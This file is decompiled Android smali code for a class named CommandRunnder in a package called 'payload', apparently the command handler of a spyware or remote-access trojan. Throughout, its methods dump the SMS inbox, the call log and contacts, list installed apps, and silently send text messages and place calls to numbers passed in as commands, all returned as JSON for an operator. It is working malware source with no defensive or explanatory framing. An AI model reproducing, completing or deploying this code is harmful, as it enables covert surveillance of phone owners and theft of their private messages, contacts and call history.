.class public Lcom/mycompany/payload/CommandRunnder;
.super Ljava/lang/Object;
.source "CommandRunnder.java"


# instance fields
.field Command:Ljava/lang/String;

.field context:Landroid/content/Context;


# direct methods
.method public constructor <init>(Landroid/content/Context;)V
    .locals 5

    .prologue
    .line 21
    move-object v0, p0

    move-object v1, p1

    move-object v3, v0

    invoke-direct {v3}, Ljava/lang/Object;-><init>()V

    move-object v3, v0

    const/4 v4, 0x0

    check-cast v4, Ljava/lang/String;

    iput-object v4, v3, Lcom/mycompany/payload/CommandRunnder;->Command:Ljava/lang/String;

    move-object v3, v0

    const/4 v4, 0x0

    check-cast v4, Landroid/content/Context;

    iput-object v4, v3, Lcom/mycompany/payload/CommandRunnder;->context:Landroid/content/Context;

    .line 22
    move-object v3, v0

    move-object v4, v1

    iput-object v4, v3, Lcom/mycompany/payload/CommandRunnder;->context:Landroid/content/Context;

    return-void
.end method

.method public constructor <init>(Landroid/content/Context;Ljava/lang/String;)V
    .locals 6

    .prologue
    .line 24
    move-object v0, p0

    move-object v1, p1

    move-object v2, p2

    move-object v4, v0

    invoke-direct {v4}, Ljava/lang/Object;-><init>()V

    move-object v4, v0

    const/4 v5, 0x0

    check-cast v5, Ljava/lang/String;

    iput-object v5, v4, Lcom/mycompany/payload/CommandRunnder;->Command:Ljava/lang/String;

    move-object v4, v0

    const/4 v5, 0x0

    check-cast v5, Landroid/content/Context;

    iput-object v5, v4, Lcom/mycompany/payload/CommandRunnder;->context:Landroid/content/Context;

    .line 25
    move-object v4, v0

    move-object v5, v2

    iput-object v5, v4, Lcom/mycompany/payload/CommandRunnder;->Command:Ljava/lang/String;

    .line 26
    move-object v4, v0

    move-object v5, v1

    iput-object v5, v4, Lcom/mycompany/payload/CommandRunnder;->context:Landroid/content/Context;

    return-void
.end method


# virtual methods
.method public Camera(Z)V
    .locals 9
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(Z)V"
        }
    .end annotation

    .prologue
    .line 32
    move-object v0, p0

    move v1, p1

    move-object v6, v0

    iget-object v6, v6, Lcom/mycompany/payload/CommandRunnder;->context:Landroid/content/Context;

    const-string v7, "camera"

    invoke-virtual {v6, v7}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v6

    check-cast v6, Landroid/hardware/camera2/CameraManager;

    move-object v3, v6

    .line 38
    move-object v6, v3

    :try_start_0
    invoke-virtual {v6}, Landroid/hardware/camera2/CameraManager;->getCameraIdList()[Ljava/lang/String;

    move-result-object v6

    const/4 v7, 0x0

    aget-object v6, v6, v7

    move-object v4, v6

    .line 39
    move-object v6, v3

    move-object v7, v4

    move v8, v1

    invoke-virtual {v6, v7, v8}, Landroid/hardware/camera2/CameraManager;->setTorchMode(Ljava/lang/String;Z)V
    :try_end_0
    .catch Landroid/hardware/camera2/CameraAccessException; {:try_start_0 .. :try_end_0} :catch_0

    :goto_0
    return-void

    :catch_0
    move-exception v6

    move-object v4, v6

    goto :goto_0
.end method

.method public getCallLogs()Ljava/lang/String;
    .locals 28

    .prologue
    .line 124
    move-object/from16 v2, p0

    new-instance v20, Lorg/json/JSONObject;

    move-object/from16 v27, v20

    move-object/from16 v20, v27

    move-object/from16 v21, v27

    invoke-direct/range {v21 .. v21}, Lorg/json/JSONObject;-><init>()V

    move-object/from16 v4, v20

    .line 125
    const-string v20, "content://call_log/calls"

    invoke-static/range {v20 .. v20}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v20

    move-object/from16 v5, v20

    .line 126
    move-object/from16 v20, v2

    move-object/from16 v0, v20

    iget-object v0, v0, Lcom/mycompany/payload/CommandRunnder;->context:Landroid/content/Context;

    move-object/from16 v20, v0

    invoke-virtual/range {v20 .. v20}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v20

    move-object/from16 v21, v5

    const/16 v22, 0x0

    check-cast v22, [Ljava/lang/String;

    const/16 v23, 0x0

    check-cast v23, Ljava/lang/String;

    const/16 v24, 0x0

    check-cast v24, [Ljava/lang/String;

    new-instance v25, Ljava/lang/StringBuffer;

    move-object/from16 v27, v25

    move-object/from16 v25, v27

    move-object/from16 v26, v27

    invoke-direct/range {v26 .. v26}, Ljava/lang/StringBuffer;-><init>()V

    const-string v26, "date"

    invoke-virtual/range {v25 .. v26}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v25

    const-string v26, " DESC"

    invoke-virtual/range {v25 .. v26}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v25

    invoke-virtual/range {v25 .. v25}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;

    move-result-object v25

    invoke-virtual/range {v20 .. v25}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v20

    move-object/from16 v6, v20

    .line 127
    const/16 v20, 0x0

    move/from16 v7, v20

    .line 128
    :goto_0
    move/from16 v20, v7

    const/16 v21, 0xf

    move/from16 v0, v20

    move/from16 v1, v21

    if-lt v0, v1, :cond_0

    .line 159
    move-object/from16 v20, v4

    invoke-virtual/range {v20 .. v20}, Lorg/json/JSONObject;->toString()Ljava/lang/String;

    move-result-object v20

    move-object/from16 v2, v20

    return-object v2

    .line 129
    :cond_0
    new-instance v20, Lorg/json/JSONObject;

    move-object/from16 v27, v20

    move-object/from16 v20, v27

    move-object/from16 v21, v27

    invoke-direct/range {v21 .. v21}, Lorg/json/JSONObject;-><init>()V

    move-object/from16 v8, v20

    .line 130
    move-object/from16 v20, v6

    invoke-interface/range {v20 .. v20}, Landroid/database/Cursor;->moveToNext()Z

    move-result v20

    .line 131
    move-object/from16 v20, v6

    move-object/from16 v21, v6

    const-string v22, "number"

    invoke-interface/range {v21 .. v22}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v21

    invoke-interface/range {v20 .. v21}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v20

    move-object/from16 v9, v20

    .line 132
    move-object/from16 v20, v6

    move-object/from16 v21, v6

    const-string v22, "date"

    invoke-interface/range {v21 .. v22}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v21

    invoke-interface/range {v20 .. v21}, Landroid/database/Cursor;->getLong(I)J

    move-result-wide v20

    move-wide/from16 v10, v20

    .line 133
    move-object/from16 v20, v6

    move-object/from16 v21, v6

    const-string v22, "duration"

    invoke-interface/range {v21 .. v22}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v21

    invoke-interface/range {v20 .. v21}, Landroid/database/Cursor;->getFloat(I)F

    move-result v20

    move/from16 v12, v20

    .line 134
    move-object/from16 v20, v6

    move-object/from16 v21, v6

    const-string v22, "type"

    invoke-interface/range {v21 .. v22}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v21

    invoke-interface/range {v20 .. v21}, Landroid/database/Cursor;->getInt(I)I

    move-result v20

    move/from16 v13, v20

    .line 135
    new-instance v20, Ljava/util/Date;

    move-object/from16 v27, v20

    move-object/from16 v20, v27

    move-object/from16 v21, v27

    move-wide/from16 v22, v10

    invoke-direct/range {v21 .. v23}, Ljava/util/Date;-><init>(J)V

    move-object/from16 v14, v20

    .line 136
    new-instance v20, Ljava/text/SimpleDateFormat;

    move-object/from16 v27, v20

    move-object/from16 v20, v27

    move-object/from16 v21, v27

    const-string v22, "dd-MM-yy HH:mm"

    invoke-direct/range {v21 .. v22}, Ljava/text/SimpleDateFormat;-><init>(Ljava/lang/String;)V

    move-object/from16 v15, v20

    .line 137
    move-object/from16 v20, v15

    move-object/from16 v21, v14

    invoke-virtual/range {v20 .. v21}, Ljava/text/SimpleDateFormat;->format(Ljava/util/Date;)Ljava/lang/String;

    move-result-object v20

    move-object/from16 v16, v20

    .line 138
    const/16 v20, 0x0

    check-cast v20, Ljava/lang/String;

    move-object/from16 v17, v20

    .line 139
    move/from16 v20, v13

    const/16 v21, 0x1

    move/from16 v0, v20

    move/from16 v1, v21

    if-ne v0, v1, :cond_2

    .line 140
    const-string v20, "Incoming call"

    move-object/from16 v17, v20

    .line 148
    :cond_1
    :goto_1
    move-object/from16 v20, v8

    :try_start_0
    const-string v21, "NUMBER"

    move-object/from16 v22, v9

    invoke-virtual/range {v20 .. v22}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    move-result-object v20

    .line 149
    move-object/from16 v20, v8

    const-string v21, "DURATION"

    move/from16 v22, v12

    move/from16 v0, v22

    float-to-double v0, v0

    move-wide/from16 v22, v0

    invoke-virtual/range {v20 .. v23}, Lorg/json/JSONObject;->put(Ljava/lang/String;D)Lorg/json/JSONObject;

    move-result-object v20

    .line 150
    move-object/from16 v20, v8

    const-string v21, "DATE"

    move-object/from16 v22, v16

    invoke-virtual/range {v20 .. v22}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    move-result-object v20

    .line 151
    move-object/from16 v20, v8

    const-string v21, "TYPE"

    move-object/from16 v22, v17

    invoke-virtual/range {v20 .. v22}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    move-result-object v20

    .line 152
    move-object/from16 v20, v4

    new-instance v21, Ljava/lang/StringBuffer;

    move-object/from16 v27, v21

    move-object/from16 v21, v27

    move-object/from16 v22, v27

    invoke-direct/range {v22 .. v22}, Ljava/lang/StringBuffer;-><init>()V

    const-string v22, "logs"

    invoke-virtual/range {v21 .. v22}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v21

    move/from16 v22, v7

    invoke-static/range {v22 .. v22}, Ljava/lang/Integer;->toString(I)Ljava/lang/String;

    move-result-object v22

    invoke-virtual/range {v21 .. v22}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v21

    invoke-virtual/range {v21 .. v21}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;

    move-result-object v21

    move-object/from16 v22, v8

    invoke-virtual/range {v20 .. v22}, Lorg/json/JSONObject;->putOpt(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
    :try_end_0
    .catch Lorg/json/JSONException; {:try_start_0 .. :try_end_0} :catch_0

    move-result-object v20

    .line 156
    :goto_2
    add-int/lit8 v7, v7, 0x1

    goto/16 :goto_0

    .line 141
    :cond_2
    move/from16 v20, v13

    const/16 v21, 0x2

    move/from16 v0, v20

    move/from16 v1, v21

    if-ne v0, v1, :cond_3

    .line 142
    const-string v20, "Outgoin call"

    move-object/from16 v17, v20

    goto :goto_1

    .line 143
    :cond_3
    move/from16 v20, v13

    const/16 v21, 0x3

    move/from16 v0, v20

    move/from16 v1, v21

    if-ne v0, v1, :cond_1

    .line 144
    const-string v20, "Missed call"

    move-object/from16 v17, v20

    goto :goto_1

    .line 152
    :catch_0
    move-exception v20

    move-object/from16 v18, v20

    goto :goto_2
.end method

.method public getContects()Ljava/lang/String;
    .locals 16

    .prologue
    .line 104
    move-object/from16 v0, p0

    new-instance v10, Lorg/json/JSONObject;

    move-object v15, v10

    move-object v10, v15

    move-object v11, v15

    invoke-direct {v11}, Lorg/json/JSONObject;-><init>()V

    move-object v2, v10

    .line 105
    move-object v10, v0

    iget-object v10, v10, Lcom/mycompany/payload/CommandRunnder;->context:Landroid/content/Context;

    invoke-virtual {v10}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v10

    sget-object v11, Landroid/provider/ContactsContract$CommonDataKinds$Phone;->CONTENT_URI:Landroid/net/Uri;

    const/4 v12, 0x0

    check-cast v12, [Ljava/lang/String;

    const/4 v13, 0x0

    check-cast v13, Landroid/os/Bundle;

    const/4 v14, 0x0

    check-cast v14, Landroid/os/CancellationSignal;

    invoke-virtual {v10, v11, v12, v13, v14}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Landroid/os/Bundle;Landroid/os/CancellationSignal;)Landroid/database/Cursor;

    move-result-object v10

    move-object v3, v10

    .line 106
    :goto_0
    move-object v10, v3

    invoke-interface {v10}, Landroid/database/Cursor;->moveToNext()Z

    move-result v10

    if-nez v10, :cond_0

    .line 120
    move-object v10, v2

    invoke-virtual {v10}, Lorg/json/JSONObject;->toString()Ljava/lang/String;

    move-result-object v10

    move-object v0, v10

    return-object v0

    .line 107
    :cond_0
    move-object v10, v3

    move-object v11, v3

    const-string v12, "display_name"

    invoke-interface {v11, v12}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v11

    invoke-interface {v10, v11}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v10

    move-object v4, v10

    .line 108
    move-object v10, v3

    move-object v11, v3

    const-string v12, "data1"

    invoke-interface {v11, v12}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v11

    invoke-interface {v10, v11}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v10

    move-object v5, v10

    .line 111
    const-string v10, "[^a-zA-Z0-9]"

    move-object v6, v10

    .line 112
    move-object v10, v4

    move-object v11, v6

    const-string v12, ""

    invoke-virtual {v10, v11, v12}, Ljava/lang/String;->replaceAll(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v10

    move-object v7, v10

    .line 114
    move-object v10, v2

    move-object v11, v7

    move-object v12, v5

    :try_start_0
    invoke-virtual {v10, v11, v12}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
    :try_end_0
    .catch Lorg/json/JSONException; {:try_start_0 .. :try_end_0} :catch_0

    move-result-object v10

    goto :goto_0

    :catch_0
    move-exception v10

    move-object v8, v10

    goto :goto_0
.end method

.method public getInstalledPackages()Ljava/lang/String;
    .locals 15

    .prologue
    .line 83
    move-object v0, p0

    new-instance v11, Lorg/json/JSONObject;

    move-object v14, v11

    move-object v11, v14

    move-object v12, v14

    invoke-direct {v12}, Lorg/json/JSONObject;-><init>()V

    move-object v2, v11

    .line 84
    move-object v11, v0

    iget-object v11, v11, Lcom/mycompany/payload/CommandRunnder;->context:Landroid/content/Context;

    invoke-virtual {v11}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v11

    const/16 v12, 0x80

    invoke-virtual {v11, v12}, Landroid/content/pm/PackageManager;->getInstalledApplications(I)Ljava/util/List;

    move-result-object v11

    move-object v3, v11

    .line 86
    move-object v11, v3

    invoke-interface {v11}, Ljava/util/List;->size()I

    move-result v11

    new-array v11, v11, [Ljava/lang/String;

    move-object v4, v11

    .line 87
    const/4 v11, 0x0

    move v5, v11

    .line 89
    move-object v11, v3

    check-cast v11, Ljava/util/Collection;

    invoke-interface {v11}, Ljava/util/Collection;->iterator()Ljava/util/Iterator;

    move-result-object v11

    move-object v6, v11

    .line 98
    :goto_0
    move-object v11, v6

    invoke-interface {v11}, Ljava/util/Iterator;->hasNext()Z

    move-result v11

    if-nez v11, :cond_0

    .line 100
    move-object v11, v2

    invoke-virtual {v11}, Lorg/json/JSONObject;->toString()Ljava/lang/String;

    move-result-object v11

    move-object v0, v11

    return-object v0

    .line 89
    :cond_0
    move-object v11, v6

    invoke-interface {v11}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v11

    check-cast v11, Landroid/content/pm/ApplicationInfo;

    move-object v8, v11

    .line 90
    move-object v11, v4

    move v12, v5

    move-object v13, v8

    iget-object v13, v13, Landroid/content/pm/PackageItemInfo;->packageName:Ljava/lang/String;

    aput-object v13, v11, v12

    .line 94
    move-object v11, v2

    move v12, v5

    :try_start_0
    invoke-static {v12}, Ljava/lang/Integer;->toString(I)Ljava/lang/String;

    move-result-object v12

    move-object v13, v8

    iget-object v13, v13, Landroid/content/pm/PackageItemInfo;->packageName:Ljava/lang/String;

    invoke-virtual {v11, v12, v13}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
    :try_end_0
    .catch Lorg/json/JSONException; {:try_start_0 .. :try_end_0} :catch_0

    move-result-object v11

    .line 98
    :goto_1
    add-int/lit8 v5, v5, 0x1

    goto :goto_0

    .line 94
    :catch_0
    move-exception v11

    move-object v9, v11

    goto :goto_1
.end method

.method public makeACall(Ljava/lang/String;)V
    .locals 9
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Ljava/lang/String;",
            ")V"
        }
    .end annotation

    .prologue
    .line 78
    move-object v0, p0

    move-object v1, p1

    new-instance v5, Landroid/content/Intent;

    move-object v8, v5

    move-object v5, v8

    move-object v6, v8

    const-string v7, "android.intent.action.CALL"

    invoke-direct {v6, v7}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    move-object v3, v5

    .line 79
    move-object v5, v3

    new-instance v6, Ljava/lang/StringBuffer;

    move-object v8, v6

    move-object v6, v8

    move-object v7, v8

    invoke-direct {v7}, Ljava/lang/StringBuffer;-><init>()V

    const-string v7, "tel:"

    invoke-virtual {v6, v7}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v6

    move-object v7, v1

    invoke-virtual {v6, v7}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v6

    invoke-virtual {v6}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;

    move-result-object v6

    invoke-static {v6}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v6

    invoke-virtual {v5, v6}, Landroid/content/Intent;->setData(Landroid/net/Uri;)Landroid/content/Intent;

    move-result-object v5

    .line 80
    move-object v5, v0

    iget-object v5, v5, Lcom/mycompany/payload/CommandRunnder;->context:Landroid/content/Context;

    move-object v6, v3

    invoke-virtual {v5, v6}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V

    return-void
.end method

.method public sendSMS(Ljava/lang/String;Ljava/lang/String;)V
    .locals 12
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Ljava/lang/String;",
            "Ljava/lang/String;",
            ")V"
        }
    .end annotation

    .prologue
    .line 73
    move-object v0, p0

    move-object v1, p1

    move-object v2, p2

    invoke-static {}, Landroid/telephony/gsm/SmsManager;->getDefault()Landroid/telephony/gsm/SmsManager;

    move-result-object v6

    move-object v4, v6

    .line 74
    move-object v6, v4

    move-object v7, v1

    const/4 v8, 0x0

    check-cast v8, Ljava/lang/String;

    move-object v9, v2

    const/4 v10, 0x0

    check-cast v10, Landroid/app/PendingIntent;

    const/4 v11, 0x0

    check-cast v11, Landroid/app/PendingIntent;

    invoke-virtual/range {v6 .. v11}, Landroid/telephony/gsm/SmsManager;->sendTextMessage(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Landroid/app/PendingIntent;Landroid/app/PendingIntent;)V

    return-void
.end method

.method public smsDumper()Ljava/lang/String;
    .locals 17

    .prologue
    .line 48
    move-object/from16 v0, p0

    new-instance v10, Lorg/json/JSONObject;

    move-object/from16 v16, v10

    move-object/from16 v10, v16

    move-object/from16 v11, v16

    invoke-direct {v11}, Lorg/json/JSONObject;-><init>()V

    move-object v2, v10

    .line 50
    const-string v10, "content://sms/inbox"

    invoke-static {v10}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v10

    move-object v3, v10

    .line 52
    const/4 v10, 0x4

    new-array v10, v10, [Ljava/lang/String;

    move-object/from16 v16, v10

    move-object/from16 v10, v16

    move-object/from16 v11, v16

    const/4 v12, 0x0

    const-string v13, "_id"

    aput-object v13, v11, v12

    move-object/from16 v16, v10

    move-object/from16 v10, v16

    move-object/from16 v11, v16

    const/4 v12, 0x1

    const-string v13, "address"

    aput-object v13, v11, v12

    move-object/from16 v16, v10

    move-object/from16 v10, v16

    move-object/from16 v11, v16

    const/4 v12, 0x2

    const-string v13, "body"

    aput-object v13, v11, v12

    move-object/from16 v16, v10

    move-object/from16 v10, v16

    move-object/from16 v11, v16

    const/4 v12, 0x3

    const-string v13, "date"

    aput-object v13, v11, v12

    move-object v4, v10

    .line 54
    move-object v10, v0

    iget-object v10, v10, Lcom/mycompany/payload/CommandRunnder;->context:Landroid/content/Context;

    invoke-virtual {v10}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v10

    move-object v11, v3

    move-object v12, v4

    const/4 v13, 0x0

    check-cast v13, Ljava/lang/String;

    const/4 v14, 0x0

    check-cast v14, [Ljava/lang/String;

    const/4 v15, 0x0

    check-cast v15, Ljava/lang/String;

    invoke-virtual/range {v10 .. v15}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v10

    move-object v5, v10

    .line 56
    move-object v10, v5

    invoke-interface {v10}, Landroid/database/Cursor;->moveToFirst()Z

    move-result v10

    .line 58
    move-object v10, v5

    move-object v11, v5

    const-string v12, "address"

    invoke-interface {v11, v12}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v11

    invoke-interface {v10, v11}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v10

    move-object v6, v10

    .line 59
    move-object v10, v5

    move-object v11, v5

    const-string v12, "body"

    invoke-interface {v11, v12}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v11

    invoke-interface {v10, v11}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v10

    move-object v7, v10

    .line 63
    move-object v10, v2

    :try_start_0
    const-string v11, "address"

    move-object v12, v6

    invoke-virtual {v10, v11, v12}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    move-result-object v10

    .line 64
    move-object v10, v2

    const-string v11, "body"

    move-object v12, v7

    invoke-virtual {v10, v11, v12}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
    :try_end_0
    .catch Lorg/json/JSONException; {:try_start_0 .. :try_end_0} :catch_0

    move-result-object v10

    .line 68
    :goto_0
    move-object v10, v2

    invoke-virtual {v10}, Lorg/json/JSONObject;->toString()Ljava/lang/String;

    move-result-object v10

    move-object v0, v10

    return-object v0

    .line 64
    :catch_0
    move-exception v10

    move-object v8, v10

    goto :goto_0
.end method
